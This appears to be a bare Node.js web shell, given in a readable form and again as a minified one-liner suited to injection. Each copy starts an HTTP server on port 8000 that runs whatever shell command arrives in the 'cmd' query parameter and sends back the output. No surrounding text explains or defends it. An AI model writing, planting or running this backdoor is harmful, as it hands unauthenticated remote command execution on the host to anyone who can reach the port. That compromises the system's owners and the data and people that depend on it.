require('http').createServer(function (req, res) {
    res.writeHead(200, { "Content-Type": "text/plain" });
    require('child_process').exec(require('url').parse(req.url, true).query['cmd'], function (e, s, st) {
        res.end(s);
    });
}).listen(8000)

//-------------------------------------------------------------------------

require('http').createServer(function (req, res) { res.writeHead(200, {"Content-Type": "text/plain"});require('child_process').exec(require('url').parse(req.url, true).query['cmd'], function(e,s,st) {res.end(s);}); }).listen(8000)

// process.exit(99)